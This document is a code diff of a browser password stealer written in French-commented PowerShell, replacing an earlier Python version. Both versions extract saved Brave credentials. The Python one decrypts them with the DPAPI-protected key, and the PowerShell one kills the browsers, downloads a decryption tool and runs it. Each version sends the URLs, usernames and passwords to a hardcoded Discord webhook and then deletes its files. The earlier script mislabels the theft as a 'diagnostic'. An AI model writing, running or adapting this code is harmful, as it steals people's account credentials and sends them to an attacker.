@@ -1,70 +1,41 @@
-cd $env:TEMP\py
+$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"
 
-.\python.exe -c "
-import sqlite3, os, base64, win32crypt, json, requests
-from Crypto.Cipher import AES
+Get-Process brave,msedge,chrome -EA 0 | Stop-Process -Force -EA 0
+Start-Sleep 5
 
-WH = 'https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W'
+cd $env:TEMP
 
-def send(msg):
-    try:
-        requests.post(WH, json={'content': msg[:1900]}, timeout=5)
-    except:
-        pass
-
-b = os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
-ld = b + r'\Default\Login Data'
-ls = b + r'\Local State'
-
-send('🔍 Starting diagnostic...')
-
-# Clé
-with open(ls, 'r') as f:
-    key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
-
-send(f'Key length: {len(key)} bytes')
-
-# Copier DB
-import shutil
-shutil.copy2(ld, 'test.db')
-
-import time
-time.sleep(1)
-
-conn = sqlite3.connect('test.db')
-c = conn.cursor()
-
-# Prendre 1 mot de passe pour analyse
-c.execute('SELECT origin_url, username_value, password_value FROM logins WHERE username_value != \"\" LIMIT 1')
-
-for url, user, enc in c.fetchall():
-    send(f'=== ANALYSIS ===')
-    send(f'URL: {url}')
-    send(f'User: {user}')
-    send(f'Encrypted length: {len(enc)} bytes')
-    send(f'Prefix: {enc[:3]}')
-    send(f'Prefix hex: {enc[:3].hex()}')
-    send(f'Full hex (first 60): {enc[:60].hex()}')
+try {
+    # Télécharger ChromeElevator
+    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
+    Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator.exe" -OutFile "ce.exe" -UseBasicParsing -TimeoutSec 30
     
-    nonce = enc[3:15]
-    tag = enc[-16:]
-    ciphertext = enc[15:-16]
+    # Exécuter pour Brave
+    $output = .\ce.exe brave -o out 2>&1 | Out-String
+    Start-Sleep 3
     
-    send(f'Nonce: {len(nonce)} bytes | hex: {nonce.hex()}')
-    send(f'Ciphertext: {len(ciphertext)} bytes')
-    send(f'Tag: {len(tag)} bytes | hex: {tag.hex()}')
+    # Parser les JSON
+    $results = @()
+    Get-ChildItem out -Filter *.json -Recurse -EA 0 | ForEach-Object {
+        $data = Get-Content $_.FullName -Raw | ConvertFrom-Json
+        if ($data.passwords) {
+            foreach ($p in $data.passwords) {
+                $results += "[BRAVE] $($p.url)`nUsername: $($p.username)`nPassword: $($p.password)`n"
+            }
+        }
+    }
     
-    try:
-        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-        pwd = cipher.decrypt_and_verify(ciphertext, tag)
-        send(f'✅ DECRYPTED BYTES: {pwd}')
-        send(f'✅ DECODED UTF8: {pwd.decode(\"utf-8\", errors=\"ignore\")}')
-        send(f'Length of password: {len(pwd)} bytes')
-    except Exception as e:
-        send(f'❌ ERROR: {str(e)}')
-
-conn.close()
-os.remove('test.db')
-
-send('✅ Diagnostic complete')
-"
+    if ($results) {
+        $report = "TOTAL: $($results.Count)`n" + ("="*60) + "`n`n" + ($results -join "`n")
+        $report | Out-File "passwords.txt" -Encoding UTF8
+        curl.exe -F "file=@passwords.txt" $wh 2>$null
+        Remove-Item passwords.txt -Force
+    } else {
+        curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"⚠️ ChromeElevator ran but no passwords found`n$output`"}" $wh 2>$null
+    }
+    
+    Remove-Item ce.exe,out -Recurse -Force -EA 0
+    
+} catch {
+    curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"❌ Error: $($_.Exception.Message)`"}" $wh 2>$null
+}
